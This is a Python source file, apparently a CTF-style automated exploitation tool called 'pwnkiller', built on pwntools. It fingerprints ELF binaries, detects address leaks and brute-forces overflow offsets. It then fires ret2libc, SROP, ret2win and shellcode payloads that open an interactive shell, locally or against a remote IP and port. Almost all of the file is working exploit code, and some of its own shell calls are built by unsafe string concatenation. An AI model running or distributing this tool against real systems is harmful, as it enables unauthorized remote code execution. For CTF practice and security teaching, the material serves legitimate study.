from pwn import *
import os
import sys
import subprocess
import time
import argparse
from termcolor import colored
import re
import requests
from struct import *

def banner():
    print(colored('''
           ██████╗ ██╗    ██╗███╗   ██╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
           ██╔══██╗██║    ██║████╗  ██║██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
           ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╔╝''','cyan',attrs=['bold']),(colored('''██║██║     ██║     █████╗  ██████╔╝
           ██╔═══╝ ██║███╗██║██║╚██╗██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
           ██║     ╚███╔███╔╝██║ ╚████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
           ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝''','white',attrs=['bold'])),
           colored("\n\t\t\t\t\t\t\t Jopraveen{w31c0M3_70_PwN_4nD_P41n}\n",'green',attrs=['blink','bold'])
    )

class analysis():
    def __init__(self):
        pass

    def static(binary):
        context.log_level = "CRITICAL" # off

        file_cmd = subprocess.check_output(['file',binary])
        mitigations = ELF(binary).checksec()
        is_relro = False
        if 'Partial RELRO' in str(mitigations):
            is_relro = False
        if 'No canary found' in str(mitigations):
            is_canary = False
        if 'NX disabled' in str(mitigations):
            is_nx = False
        if 'No PIE' in str(mitigations):
            is_pie = False
        can_execute_shellcode = False
        if 'Has RWX' in str(mitigations):
            can_execute_shellcode = True
        if 'Full RELRO' in str(mitigations):
            is_relro = True
        if 'Canary found' in str(mitigations):
            is_canary = True
        if 'NX enabled' in str(mitigations):
            is_nx = True
        if 'PIE enabled' in str(mitigations):
            is_pie = True
        is_packed = False
        if 'Packer' in str(mitigations):
            is_packed = True
        is_x86_64 = False
        if 'x86-64' in str(file_cmd):
            is_x86_64 = True
        is_stripped = True
        if 'not stripped' in str(file_cmd):
            is_stripped=False
        is_static = True
        if 'dynamically linked' in str(file_cmd):
            is_static=False
        return is_relro,is_canary,is_nx,is_pie,can_execute_shellcode,is_packed,is_x86_64,is_static,is_stripped

    def dynamic(binary):
        elf = context.binary = ELF(binary,checksec=False)
        p = elf.process()

        context.log_level = "INFO"
        log.info("Checking for leaks")
        wt_it_gives = ""
        theres_a_pie_leak = False
        theres_a_libc_leak = False
        theres_a_canary_leak = False
        theres_a_stack_leak = False

        # checking for leaks
        try:
            for i in range(20):
                wt_it_gives += p.clean(timeout=0.02).decode('latin-1')
        except:
            pass
        # regex check
        if len(wt_it_gives) > 10:
            context.log_level = "INFO"
            pattern_of_pie_leak = re.compile("0x5\w\w\w\w\w\w\w\w\w\w\w").findall(wt_it_gives)
            pattern_of_libc_leak = re.compile("0x7f\w\w\w\w\w\w\w\w\w\w").findall(wt_it_gives)
            pattern_of_canary = re.compile("0x\w\w\w\w\w\w\w\w\w\w\w\w\w\w00").findall(wt_it_gives)
            # do we have any leaks?
            if len(pattern_of_canary) > 0:
                log.info(f"Theres a canary leak: {pattern_of_canary[0]}")
                theres_a_canary_leak = True
            if len(pattern_of_pie_leak) > 0:
                log.info(f"Theres a pie leak: {pattern_of_pie_leak[0]}")
                theres_a_pie_leak = True

            # checking it's a stack leak or libc leak
            if len(pattern_of_libc_leak) > 0:
                last_3_nibble_of_leak = pattern_of_libc_leak[0][-3:]

                context.log_level = "CRITICAL"
                p = elf.process()
                context.log_level = "info"
                wt_it_gives_again = ""
                try:
                    for i in range(20):
                        wt_it_gives_again += p.clean(timeout=0.02).decode('latin-1')
                except:
                    pass
                pattern_of_libc_leak_again = re.compile("0x7f\w\w\w\w\w\w\w\w\w\w").findall(wt_it_gives_again)
                if last_3_nibble_of_leak == pattern_of_libc_leak_again[0][-3:]:
                    theres_a_libc_leak = True
                    log.info(f"Theres a libc leak: {pattern_of_libc_leak[0]}")
                else:
                    log.info(f"Theres a stack leak: {pattern_of_libc_leak[0]}")
                    log.info(f'Try "-exp leak+sc" to exploit this')
                    theres_a_stack_leak = True

        # if it gives nothing
        # send some input
        context.log_level = "CRITICAL"

        # while loop check
        p = elf.process()
        may_be_a_while_loop = False
        # try:
        #     for i in range(50):
        #         p.sendline('JOO')
        #         if i > 48:
        #             context.log_level = "INFO"
        #             log.info("May be a while loop o.O")
        #             context.log_level = "CRITICAL"
        #             may_be_a_while_loop = True
        #             p.close()
        # except:
        #     pass

        return theres_a_pie_leak,theres_a_libc_leak,theres_a_canary_leak,theres_a_stack_leak,may_be_a_while_loop

class offset():
    def __init__(self):
        pass
    def normal(binary):
        offset_payload = 1
        for i in range(2000): # increase if u want more offset
            os.system('printf '+'A'*offset_payload+' | ./'+binary+' > offset_output.txt ;echo $? > checkoffset.txt')
            seg_fault = open('checkoffset.txt','r').read()
            # return value 139 => segfault
            if '139' in seg_fault:
                os.system('printf '+'A'*(offset_payload+1)+' | ./'+binary+' > offset_output.txt ;echo $? > checkoffset.txt')
                seg_fault = open('checkoffset.txt','r').read()
                if '140' in seg_fault:
                    pass
                elif '139' in seg_fault:
                    break
            # I'm printing the trying offset value like this coz pwn tools sets stdout freeze = True, so we can't clear the output "\r"
            # you can see this in "/usr/local/lib/python3.9/dist-packages/pwnlib/term/term.py" --> line 134
            os.system('''python3 -c "print('\033[1;36;40m[+] Finding offset:  '''+str(offset_payload)+''' ',end='\\r')"''')
            offset_payload += 1
        offset = offset_payload - 1
        os.system('rm checkoffset.txt offset_output.txt')
        if offset % 2 == 0:
            return offset
        else:
            return offset - 1
    def with_canary(binary):
        offset_payload = 1
        for i in range(2000):
            os.system('printf '+'A'*offset_payload+' | ./'+binary+' > offset_output.txt ;echo $? > checkoffset.txt')
            seg_fault = open('checkoffset.txt','r').read()
            # return value 134 => segfault
            if '134' in seg_fault:
                os.system('printf '+'A'*(offset_payload+1)+' | ./'+binary+' > offset_output.txt ;echo $? > checkoffset.txt')
                seg_fault = open('checkoffset.txt','r').read()
                if '135' in seg_fault:
                    pass
                elif '134' in seg_fault:
                    break
            # I'm printing the trying offset value like this coz pwn tools sets stdout freeze = True, so we can't clear the output
            # you can see this in "/usr/local/lib/python3.9/dist-packages/pwnlib/term/term.py" --> line 134
            os.system('''python3 -c "print('\033[1;36;40m[+] Finding canary offset:  '''+str(offset_payload)+''' ',end='\\r')"''')
            offset_payload += 1
        if offset_payload % 8 != 0:
            offset_payload = offset_payload - 1
        canary_offset = offset_payload
        os.system('rm checkoffset.txt offset_output.txt')
        return canary_offset


class exploit():
    def __init__(self):
        pass
    def ret2plt_local(binary,offset):
        context.log_level = "INFO"
        log.info("Trying return to PLT attack")
        context.log_level = "CRITICAL"
        elf = context.binary = ELF(binary,checksec=False)
        elf_rop = ROP(elf)
        libc = elf.libc
        p = elf.process()
        pop_rdi = elf_rop.find_gadget(['pop rdi','ret'])[0]
        ret = elf_rop.find_gadget(['ret'])[0]

        try:
            elf.got['puts']
            leak_from = 'puts'
        except:
            try:
                elf.got['printf']
                leak_from = 'printf'
            except:
                context.log_level = "INFO"
                log.warning("No puts/printf, Try other techniques")
                exit()

       # leaking libc puts/printf
        payload_for_leak = (b'A'*offset
                + p64(ret)
                + p64(pop_rdi)
                + p64(elf.got[leak_from])
                + p64(elf.plt[leak_from])
                + p64(elf.sym['main'])
        )
        p.sendline(payload_for_leak)
        plt_leak = u64((p.recvuntil('\x7f')[-6::1]+b"\x00\x00").decode('latin-1'))
        context.log_level = "INFO"
        log.success(f"{leak_from} leak: {hex(plt_leak)}")

        # exploiting it
        libc_base = plt_leak - libc.sym[leak_from]
        log.success(f"libc base: {hex(libc_base)}")

        payload_for_shell = (b'A'*offset
                + p64(ret)
                + p64(ret)
                + p64(ret)
                + p64(pop_rdi)
                + p64(libc_base + next(libc.search(b'/bin/sh\x00')))
                + p64(libc_base + libc.sym['system'])
        )

        p.sendline(payload_for_shell)
        p.sendline('id')
        p.interactive()

    def ret2plt_remote(binary,offset,ip,port):
        context.log_level = "INFO"
        log.info("Trying return to PLT attack in remote server")
        # context.log_level = "CRITICAL"
        r = remote(ip,port) # remote
        elf = context.binary = ELF(binary,checksec=False)
        elf_rop = ROP(elf)
        p = elf.process()
        pop_rdi = elf_rop.find_gadget(['pop rdi','ret'])[0]
        ret = elf_rop.find_gadget(['ret'])[0]

        try:
            elf.got['puts']
            leak_from = 'puts'
        except:
            try:
                elf.got['printf']
                leak_from = 'printf'
            except:
                context.log_level = "INFO"
                log.warning("No puts/printf, Try other techniques")
                exit()

       # leaking libc puts/printf (server)
        payload_for_leak = (b'A'*offset
                + p64(ret)
                + p64(pop_rdi)
                + p64(elf.got[leak_from])
                + p64(elf.plt[leak_from])
                + p64(elf.sym['main'])
        )
        r.clean()
        r.sendline(payload_for_leak)
        plt_leak = u64((r.recvuntil('\x7f')[-6::1]+b"\x00\x00").decode('latin-1'))
        context.log_level = "INFO"
        log.success(f"{leak_from} leak: {hex(plt_leak)}")

        ## finding libc and exploiting it
        response = requests.post('https://libc.rip/api/find',json={"symbols":{leak_from:hex(plt_leak)}}).json()
        for i in response:
            context.log_level = "INFO"
            log.info(f"Trying {list(i.values())[2]}")
            symbols = list(i.values())[-2]
            libc_base = plt_leak - int(dict(symbols)[leak_from],16)
            log.success(f"libc base: {hex(libc_base)}")
            log.success(f"_bin_sh: {dict(symbols)['str_bin_sh']}")
            log.success(f"system: {dict(symbols)['system']}")

            payload_for_shell_remote = (b'A'*offset
                + p64(ret)
                + p64(ret)
                + p64(ret)
                + p64(pop_rdi)
                + p64(libc_base + int(dict(symbols)['str_bin_sh'],16))
                + p64(libc_base + int(dict(symbols)['system'],16))
            )
            try:
                r.sendline(payload_for_shell_remote)
                r.interactive()
            except Exception as remote_server_error:
                if 'KeyboardInterrupt' in str(remote_server_error):
                    log.success("Thanks for using pwnkiller <3")
                    exit()
                r = remote(ip,int(port))
                r.clean()
                r.sendline(payload_for_leak)
                plt_leak = u64((r.recvuntil('\x7f')[-6::1]+b"\x00\x00").decode('latin-1'))
                log.success(f'{leak_from} leak : {hex(plt_leak)}')
                pass
        confirm_shell = input("GOT shell? [Y/N]").lower()
        context.log_level = "INFO"
        if 'y' in confirm_shell:
            log.info("Thanks for using pwnkiller")
            exit()
        else:
            log.warning("Can you please try again?")
            exit()

    def srop(binary,offset,ip=None,port=None):
        if offset % 8 != 0:
            offset = offset + 2
        context.log_level = "INFO"
        log.info("Trying ROP with ropper")

        elf = context.binary = ELF(binary,checksec=False)
        elf_rop = ROP(elf)
        p_srop = elf.process()

        ## ezy pz with ropper
        os.system(''' ropper --file '''+binary+''' --chain "execve cmd=/bin/sh" | sed "s/rop += '\/\/bin\/sh/rop += b'\/\/bin\/sh/g;  s/rop = ''/rop = b'A'*'''+str(offset)+'''/g;" | awk '/env python/,0'  > srop_payload.py ''')
        os.system('python2 srop_payload.py > srop_payload')
        srop_payload = open('srop_payload','rb').read()
        if ip and port:
            p_srop = remote(ip,port)
        p_srop.sendline(srop_payload)
        p_srop.interactive()

    def ret2win(binary,offset,win_addr,ip=None,port=None):
        context.log_level = "INFO"
        log.info("Trying ret2win")

        elf = context.binary = ELF(binary,checksec=False)
        elf_rop = ROP(elf)
        ret = elf_rop.find_gadget(['ret'])[0]
        p = elf.process()

        payload = (b'A'*offset
            + p64(ret)
            + p64(ret)
            + p64(win_addr)
        )
        if ip and port:
            p = remote(ip,port)
        p.sendline(payload)
        p.interactive()

    def leak_shellcode(binary,offset,ip=None,port=None):
        log.info("Trying ret2shellcode with leak")
        elf = context.binary = ELF(binary,checksec=False)
        p = elf.process()
        if ip and port:
            p = remote(ip,port)

        p.recvuntil('0x7f')
        buffer_base = int('0x7f'+p.recv(10).decode(),16)
        log.info(f"buffer base: {hex(buffer_base)}")

        payload = asm(shellcraft.sh())
        payload += b'A'*(offset-len(payload))
        payload += p64(buffer_base)

        p.sendline(payload)
        p.interactive()
